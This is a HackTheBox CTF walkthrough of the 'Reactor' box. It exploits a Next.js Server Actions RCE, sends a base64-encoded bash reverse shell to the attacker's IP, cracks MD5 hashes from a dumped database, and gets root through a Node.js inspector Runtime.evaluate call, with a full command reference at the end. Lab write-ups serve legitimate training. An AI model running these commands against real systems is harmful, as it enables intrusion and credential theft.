# HackTheBox — Reactor Writeup
**Difficulty:** Very Easy | **OS:** Linux | **Author:** You

---

## What is this box about?

Reactor runs a nuclear monitoring web app built with **Next.js 15.0.3**. The attack chain is:

1. Exploit a known CVE in Next.js to get a shell on the server
2. Find a database file with password hashes
3. Crack the hash and SSH in as a real user
4. Abuse a root process running a Node.js debugger to read the root flag

---

## Step 1 — Port Scanning (Nmap)

The first thing in any box is to scan for open ports. We use `nmap` to find what services are running.

```bash
nmap -sC -sV -oN nmap.txt 10.129.1.191
```

**What each flag means:**
- `-sC` — run default scripts (tries to grab version info, certificates, etc.)
- `-sV` — detect service versions
- `-oN nmap.txt` — save output to a file

**Results:**
```
PORT     STATE SERVICE
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
3000/tcp open  http    Next.js application
```

Two ports open:
- **Port 22** — SSH (used later to log in)
- **Port 3000** — A web application powered by Next.js

---

## Step 2 — Web Reconnaissance

We visit `http://10.129.1.191:3000` and use `whatweb` to fingerprint the technology:

```bash
whatweb http://10.129.1.191:3000
```

**Output tells us:**
- Title: `ReactorWatch | Core Monitoring System`
- Framework: **Next.js** (confirmed by `X-Powered-By: Next.js` header)

### Finding the Exact Version

We use the RSC (React Server Component) trick — by sending a special header, Next.js reveals its internal data including the version:

```bash
curl -s "http://10.129.1.191:3000/" \
  -H "RSC: 1" \
  -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
```

From the output we extract the build ID and confirm **Next.js version 15.0.3**.

### What the homepage shows

The homepage is a public dashboard showing:
- Reactor stats (temperature, pressure, etc.)
- **Staff names**: Dr. Elena Rodriguez, Marcus Kim, James Thompson
- No login form visible — but the app has more hidden pages

---

## Step 3 — Finding the Vulnerability (CVE-2025-55182)

Next.js 15.0.3 is vulnerable to **CVE-2025-55182**, also called **"React2Shell"**.

### What is CVE-2025-55182?

Next.js has a feature called **React Server Functions** (Server Actions). These let the browser call server-side functions via HTTP POST requests. The data is serialized using the **React Flight Protocol**.

The vulnerability is a **prototype pollution** bug: when Next.js deserializes the POST body, it doesn't check if object keys are safe. An attacker can craft a malicious payload that:
1. Pollutes JavaScript's object prototype
2. Tricks the server into calling `Function()` with attacker-controlled code
3. Executes arbitrary shell commands on the server

**The key insight:** This happens *before* any authentication check, so it works without credentials. All you need is the `Next-Action: x` header to trigger it.

### Finding the PoC

```bash
# Search GitHub for exploit code
curl -s "https://api.github.com/search/repositories?q=CVE-2025-55182&sort=stars" | \
  python3 -c "import sys,json; [print(r['full_name'], r['html_url']) for r in json.load(sys.stdin)['items'][:5]]"
```

We find multiple repos. We use: `https://github.com/msanft/CVE-2025-55182`

```bash
git clone https://github.com/msanft/CVE-2025-55182
cd CVE-2025-55182
```

---

## Step 4 — Exploiting CVE-2025-55182 (Getting a Shell)

### How the exploit works (simplified)

The `poc.py` script sends a crafted multipart POST request to the Next.js app. The payload looks roughly like this:

```python
# The malicious payload tricks Next.js into calling:
# Function("your_command_here")()
# Which runs as the node user on the server

files = {
    "0": (None, json.dumps(crafted_chunk)),  # The poison
    "1": (None, '"$@0"'),                    # Self-reference trick
}
headers = {"Next-Action": "x"}  # Triggers server action handler
```

### Testing RCE

```bash
python3 poc.py http://10.129.1.191:3000 id
```

**Output:**
```
500
0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
1:E{"digest":"uid=999(node) gid=988(node) groups=988(node)"}
```

The `id` command ran and returned `uid=999(node)` — we have **Remote Code Execution**!

### Getting a Reverse Shell

A reverse shell is when the target machine connects *back* to us, giving us an interactive terminal.

**Terminal 1 — Start a listener on your Kali machine:**
```bash
nc -lvnp 4444
```
- `nc` = netcat, a network tool
- `-l` = listen mode
- `-v` = verbose output
- `-n` = no DNS resolution
- `-p 4444` = listen on port 4444

**Terminal 2 — Trigger the reverse shell:**

First encode the shell command in base64 (to avoid issues with special characters):
```bash
echo 'bash -i >& /dev/tcp/10.10.14.115/4444 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTUvNDQ0NCAwPiYxCg==
```

Then fire the exploit:
```bash
python3 poc.py http://10.129.1.191:3000 "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTUvNDQ0NCAwPiYxCg== | base64 -d | bash"
```

**Terminal 1 receives:**
```
connect to [10.10.14.115] from (UNKNOWN) [10.129.1.191] 35390
node@reactor:/opt/reactor-app$
```

We now have a shell as the `node` user!

---

## Step 5 — Lateral Movement (node → engineer)

### Exploring the file system

```bash
ls /opt/reactor-app
```

```
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db          <-- SQLite database!
```

### Dumping the database

```bash
sqlite3 reactor.db "SELECT * FROM users;"
```

**Output:**
```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Two users with password hashes! These are **MD5 hashes** (32 hex characters).

### Cracking the hashes

On your Kali machine:
```bash
echo "a203b22191d744a4e70ada5c101b17b8" > /tmp/hashes.txt
echo "39d97110eafe2a9a68639812cd271e8e" >> /tmp/hashes.txt

# Hashcat: -m 0 = MD5 mode
hashcat -m 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
```

**Results:**
- `engineer` hash → **`reactor1`**

### SSH as engineer

```bash
ssh engineer@10.129.1.191
# Password: reactor1
```

```bash
cat user.txt
# 4ad567c73f52aba502b05e467b2901d3
```

**User flag: `4ad567c73f52aba502b05e467b2901d3`** ✅

---

## Step 6 — Privilege Escalation (engineer → root)

### Finding the attack surface

```bash
ps aux | grep node
```

**Key output:**
```
root  1409  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Root is running a Node.js process with `--inspect=127.0.0.1:9229`. This is the **Node.js Inspector** (Chrome DevTools Protocol), which allows remote debugging. Since it's running as root, we can use it to execute commands as root!

It's bound to `127.0.0.1` (localhost only), so we need to tunnel it to our Kali machine.

### Port Forwarding

SSH port forwarding lets us access a port on the remote machine as if it were local:

```bash
# From Kali — forward remote port 9229 to our local port 9229
ssh -L 9229:127.0.0.1:9229 engineer@10.129.1.191
# Password: reactor1
```

- `-L 9229:127.0.0.1:9229` means: "forward my local port 9229 to the target's localhost:9229"

### Verifying the inspector is accessible

In a new terminal on Kali:
```bash
curl -s http://127.0.0.1:9229/json/list
```

**Output:**
```json
[{
  "id": "18003ec2-a04d-4840-adba-5938459a4900",
  "title": "/opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/18003ec2-a04d-4840-adba-5938459a4900"
}]
```

The inspector is accessible and gives us a WebSocket URL.

### Connecting to the inspector

```bash
# Install wscat (WebSocket command-line client)
npm install -g wscat

# Connect to the root Node.js process
wscat -c "ws://127.0.0.1:9229/18003ec2-a04d-4840-adba-5938459a4900"
```

### Executing commands as root

Once connected, we send JavaScript to execute via the `Runtime.evaluate` method:

```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()","returnByValue":true}}
```

**Breaking this down:**
- `Runtime.evaluate` — tells the Node.js process to evaluate JavaScript
- `process.mainModule.require('child_process')` — imports Node's built-in shell execution module
- `.execSync('cat /root/root.txt')` — runs the shell command
- `.toString()` — converts the output to a string we can read

**Response:**
```json
{"id":1,"result":{"result":{"type":"string","value":"cb25213879d6b712c4b235606f8cb84c\n"}}}
```

**Root flag: `cb25213879d6b712c4b235606f8cb84c`** ✅

---

## Full Attack Chain Summary

```
[Nmap scan] → Found port 3000 (Next.js 15.0.3)
      ↓
[CVE-2025-55182] → RCE via React Server Components → shell as 'node'
      ↓
[SQLite DB] → Found MD5 hash for 'engineer' → cracked to 'reactor1'
      ↓
[SSH] → Logged in as 'engineer' → user.txt ✅
      ↓
[Node.js Inspector] → Root process on port 9229 → SSH tunnel → WebSocket RCE
      ↓
[Root flag] → root.txt ✅
```

---

## Key Concepts Learned

| Concept | What it is |
|---|---|
| Nmap | Port scanner — finds open services |
| Next.js RSC | React Server Components — server-side rendering feature |
| CVE-2025-55182 | Prototype pollution bug in React's deserialization |
| Reverse Shell | Target connects back to attacker for interactive access |
| SQLite | Lightweight file-based database |
| MD5 | Weak, crackable password hashing algorithm |
| SSH Port Forwarding | Tunnel a remote port to your local machine |
| Node.js Inspector | Remote debugging protocol — can execute arbitrary JS |
| Chrome DevTools Protocol | WebSocket API for controlling a Node.js process |

---

## Commands Quick Reference

```bash
# Recon
nmap -sC -sV -oN nmap.txt 10.129.1.191
whatweb http://10.129.1.191:3000

# Get Next.js version / app data
curl -s "http://10.129.1.191:3000/" -H "RSC: 1" \
  -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D"

# Get PoC
git clone https://github.com/msanft/CVE-2025-55182
cd CVE-2025-55182

# Test RCE
python3 poc.py http://10.129.1.191:3000 id

# Reverse shell
nc -lvnp 4444   # Terminal 1
echo 'bash -i >& /dev/tcp/10.10.14.115/4444 0>&1' | base64   # Get b64
python3 poc.py http://10.129.1.191:3000 "echo <BASE64> | base64 -d | bash"

# Loot DB
sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"

# Crack hash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SSH + port forward
ssh -L 9229:127.0.0.1:9229 engineer@10.129.1.191

# Check inspector
curl -s http://127.0.0.1:9229/json/list

# Connect and exploit
npm install -g wscat
wscat -c "ws://127.0.0.1:9229/<UUID>"
# Then send:
# {"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()","returnByValue":true}}
```
